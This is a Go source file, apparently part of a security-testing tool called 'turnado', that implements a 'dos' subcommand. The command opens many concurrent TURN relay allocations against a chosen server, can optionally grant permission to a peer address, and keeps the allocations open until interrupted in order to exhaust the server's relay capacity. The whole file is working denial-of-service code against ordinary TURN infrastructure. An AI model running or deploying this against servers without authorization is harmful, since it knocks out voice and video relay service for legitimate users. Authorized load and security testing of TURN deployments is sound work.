package app

import (
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"sync"

	"github.com/pion/turn/v2"
	"github.com/spf13/pflag"
)

type dosCfg struct {
	Common   commonConfig
	Sessions int
	Peer     string
}

type turnSession struct {
	Client    *turn.Client
	RelayConn net.PacketConn
	Cleanup   func()
}

func RunDOS(argv []string) error {
	fs := pflag.NewFlagSet("dos", pflag.ContinueOnError)

	origOut := io.Discard
	fs.SetOutput(origOut)

	var cfg dosCfg
	cfg.Common.Software = "turnado/dos"
	addCommonFlags(fs, &cfg.Common)

	fs.IntVarP(&cfg.Sessions, "sessions", "s", 1, "Number of TURN allocations to create")
	fs.StringVarP(&cfg.Peer, "peer", "P", "", "Optional peer ip:port for CreatePermission")

	help := fs.BoolP("help", "h", false, "Show help message")

	fs.Usage = func() {
		fmt.Fprintln(os.Stdout, "Usage: turnado dos [options]")
		fs.SetOutput(os.Stdout)
		fs.PrintDefaults()
		fs.SetOutput(origOut)
	}

	if err := fs.Parse(argv); err != nil {
		return err
	}
	if *help {
		fs.Usage()
		return nil
	}
	if err := requireTurn(fs, cfg.Common.Turn); err != nil {
		return err
	}
	if err := validateCommon(cfg.Common); err != nil {
		return err
	}

	log.SetFlags(log.LstdFlags | log.Lmicroseconds)

	if cfg.Sessions <= 0 {
		return fmt.Errorf("invalid --sessions %d (must be >= 1)", cfg.Sessions)
	}

	var peerAddr *net.UDPAddr
	if cfg.Peer != "" {
		pa, err := net.ResolveUDPAddr("udp", cfg.Peer)
		if err != nil {
			return fmt.Errorf("ResolveUDPAddr(peer=%q) failed: %w", cfg.Peer, err)
		}
		peerAddr = pa
	}

	log.Printf("Creating %d allocations against %s via %s", cfg.Sessions, cfg.Common.Turn, cfg.Common.Transport)

	var (
		wg       sync.WaitGroup
		mu       sync.Mutex
		sessions []*turnSession
	)

	for i := 0; i < cfg.Sessions; i++ {
		i := i
		wg.Add(1)
		go func() {
			defer wg.Done()
			client, _, cleanup, err := newTurnClient(cfg.Common)
			if err != nil {
				log.Printf("[session %d] client init failed: %v", i, err)
				return
			}

			relayConn, err := client.Allocate()
			if err != nil {
				cleanup()
				log.Printf("[session %d] allocate failed: %v", i, err)
				return
			}

			if peerAddr != nil {
				if err := client.CreatePermission(peerAddr); err != nil && cfg.Common.Verbose > 0 {
					log.Printf("[session %d] CreatePermission(%s) failed: %v", i, peerAddr, err)
				}
			}

			mu.Lock()
			sessions = append(sessions, &turnSession{
				Client:    client,
				RelayConn: relayConn,
				Cleanup:   cleanup,
			})
			mu.Unlock()

			if cfg.Common.Verbose > 0 {
				log.Printf("[session %d] relay=%s", i, relayConn.LocalAddr().String())
			}
		}()
	}
	wg.Wait()

	if len(sessions) == 0 {
		return errors.New("no successful sessions created")
	}

	log.Printf("Active allocations: %d/%d. Press Ctrl+C to close.", len(sessions), cfg.Sessions)
	waitForSignal()

	for _, s := range sessions {
		if s == nil {
			continue
		}
		if s.RelayConn != nil {
			_ = s.RelayConn.Close()
		}
		if s.Cleanup != nil {
			s.Cleanup()
		}
	}
	return nil
}
